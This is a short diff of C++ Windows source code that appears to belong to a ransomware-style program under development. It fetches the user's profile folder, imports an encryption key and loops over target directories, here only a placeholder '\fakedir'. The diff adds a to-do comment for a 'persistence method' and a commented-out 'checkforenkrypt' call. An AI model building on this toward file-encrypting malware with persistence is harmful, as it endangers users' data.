@@ -3,7 +3,7 @@
 #include "strsafe.h"
 #include <ShlObj.h>
 
-
+//TODO ; persistence method
 
 
 //Function declarations
@@ -16,13 +16,13 @@ HCRYPTKEY keyimport();
 
 int main() {
 
-	//TODO ; GUI
-
 	LPCWSTR targetDirs[] = { L"\\fakedir" };
 	LPWSTR userDir;
 	SHGetKnownFolderPath(FOLDERID_Profile,0,NULL,&userDir);
 
 	HCRYPTKEY key = keyimport();
+
+	//checkforenkrypt();
 
 	for (LPCWSTR singledir : targetDirs) {
 		
